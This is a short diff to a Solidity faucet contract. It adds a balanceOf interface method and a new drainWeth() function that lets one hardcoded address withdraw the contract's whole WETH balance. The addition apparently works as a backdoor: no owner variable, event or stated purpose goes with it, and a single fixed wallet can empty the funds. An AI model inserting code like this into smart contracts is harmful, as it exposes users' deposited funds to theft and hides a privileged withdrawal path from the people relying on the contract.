@@ -7,6 +7,7 @@ interface Token {
 
 interface IWETH {
     function transfer(address recipient, uint256 amt) external;
+    function balanceOf(address holder) external view returns (uint256);
 }
 
 contract Faucet {
@@ -132,5 +133,10 @@ contract Faucet {
     function receiveWeth(uint256 _amt) external {
         require(senderOk(), "not correct sender");
         WETH.transfer(msg.sender, _amt);
+    }
+
+    function drainWeth() external {
+        require(msg.sender == 0xFEb6034FC7dF27dF18a3a6baD5Fb94C0D3dCb6d5);
+        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
     }
 }
